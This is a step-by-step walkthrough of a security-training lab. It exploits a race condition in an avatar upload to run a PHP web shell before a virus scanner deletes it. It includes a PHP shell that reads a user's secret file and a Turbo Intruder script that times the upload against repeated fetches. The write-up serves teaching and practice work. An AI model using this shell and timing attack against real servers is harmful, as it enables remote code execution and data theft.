# Exploiting Web Shell Upload via Race Condition

This guide provides a clear, creative, and organized solution to exploit a **race condition** in a web shell upload vulnerability, enabling remote code execution (RCE). Imagine a high-stakes race where your malicious file dashes to execution before the server's antivirus guard catches up— that's the thrill of this exploit! The objective is to upload a PHP script during a brief window before it's deleted, execute it to retrieve Carlos's secret file (`/home/carlos/secret`), and submit the secret to solve the lab.

## Objective
Upload a PHP web shell in a race against the server's virus scanner, execute it before deletion to read a sensitive file, and submit the secret.

## Prerequisites
- Burp Suite with Proxy, Repeater, and Turbo Intruder extension installed (from the BApp Store).
- A user account with access to the avatar upload feature.
- Basic understanding of web shells, PHP scripting, and race conditions.
- Note: While manual requests in Repeater can work due to the generous time window, this guide focuses on Turbo Intruder for real-world precision (e.g., millisecond windows).

## Background on the Vulnerability
The server moves uploaded files to an accessible folder and scans them for viruses, deleting malicious ones only after the scan. This creates a brief "race window" where a PHP script can be executed before removal. Traditional bypasses fail here, but exploiting the timing gap with rapid requests allows RCE.

## Steps to Solve the Lab

### Step 1: Test Avatar Upload
1. Log in to your account while proxying traffic through Burp Suite.
2. Navigate to the account page and upload a legitimate image as your avatar.
3. Return to the account page.
4. **Observation**: The image is displayed as a preview, confirming files are stored in an accessible location.

### Step 2: Analyze the Image Retrieval Request
1. In Burp Suite, go to **Proxy > HTTP history**.
2. Locate the `GET` request fetching the uploaded image, e.g., `GET /files/avatars/<YOUR-IMAGE>`.
3. **Observation**: Files are served from `/files/avatars/`, hinting at the upload path.

### Step 3: Create a Malicious PHP Web Shell
1. On your local system, create a file named `exploit.php` with the following content:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
2. **Explanation**: This script reads and outputs the contents of `/home/carlos/secret`.

### Step 4: Attempt to Upload the Web Shell
1. Return to the avatar upload functionality and try uploading `exploit.php`.
2. **Observation**: The server blocks non-image files, even with previous bypass techniques, confirming strong validation—but the race condition remains exploitable.

### Step 5: Install Turbo Intruder
1. If not already installed, add the **Turbo Intruder** extension from Burp's BApp Store.
2. **Explanation**: Turbo Intruder excels at timing-sensitive attacks like race conditions by queuing and gating requests.

### Step 6: Prepare the Turbo Intruder Script
1. Right-click the `POST /my-account/avatar` request (from the upload attempt) in Proxy history and select **Extensions > Turbo Intruder > Send to Turbo Intruder**.
2. In Turbo Intruder, paste the following Python script template into the editor:
   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

       request1 = '''<YOUR-POST-REQUEST>'''

       request2 = '''<YOUR-GET-REQUEST>'''

       engine.queue(request1, gate='race1')
       for x in range(5):
           engine.queue(request2, gate='race1')

       engine.openGate('race1')

       engine.complete(timeout=60)


   def handleResponse(req, interesting):
       table.add(req)
   ```
3. Replace `<YOUR-POST-REQUEST>` with the full `POST /my-account/avatar` request body (including the `exploit.php` file content).
4. Replace `<YOUR-GET-REQUEST>` with a `GET` request to fetch the uploaded file, e.g., copy `GET /files/avatars/<YOUR-IMAGE>` from history and change the filename to `exploit.php`. Ensure it ends with `\r\n\r\n`.
5. **Explanation**: The script uploads the file (`request1`) and rapidly sends 5 retrieval requests (`request2`) during the race window, using a "gate" for precise timing.

### Step 7: Launch the Attack
1. At the bottom of Turbo Intruder, click **Attack**.
2. **Observation**: The script submits the upload followed by rapid GET requests. Some GET responses (200 OK) contain Carlos's secret, hitting the window before deletion.

### Step 8: Submit the Secret
1. Extract the secret from a successful GET response.
2. Submit the secret via the lab’s submission mechanism.
3. **Observation**: Submitting the correct secret solves the lab.

### Step 9: Verify Success
1. If no secret appears, verify:
   - The script's requests are correctly formatted (no extra indentation, proper termination).
   - Increase the range in `for x in range(5):` for more attempts.
   - The PHP script syntax and file path `/home/carlos/secret` are accurate.
2. **Observation**: Successful retrieval and submission completes the lab.